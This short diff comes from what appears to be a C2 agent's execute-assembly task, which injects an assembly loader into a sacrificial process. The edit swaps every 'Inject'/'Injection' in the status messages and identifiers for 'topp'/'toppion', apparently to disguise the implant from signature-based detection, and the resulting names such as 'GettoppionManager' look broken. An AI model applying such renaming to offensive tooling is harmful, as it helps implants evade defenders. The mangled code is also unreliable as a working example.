@@ -214,7 +214,7 @@ namespace Tasks
                             }
                         )
                     );
-                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", false, "Injecting stub..."));
+                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", false, "topping stub..."));
                 if (!proc.topp(exeAsmPic))
                 {
                     throw new ExecuteAssemblyException($"Failed to topp assembly loader into sacrificial process {info.Application}.");
@@ -226,8 +226,8 @@ namespace Tasks
                     "",
                     new IMythicMessage[]
                     {
-                        Artifact.ProcessInject((int) proc.PID,
-                            _agent.GetInjectionManager().GetCurrentTechnique().Name)
+                        Artifact.Processtopp((int) proc.PID,
+                            _agent.GettoppionManager().GetCurrentTechnique().Name)
                     }));
 
                 IPCCommandArguments cmdargs = new IPCCommandArguments
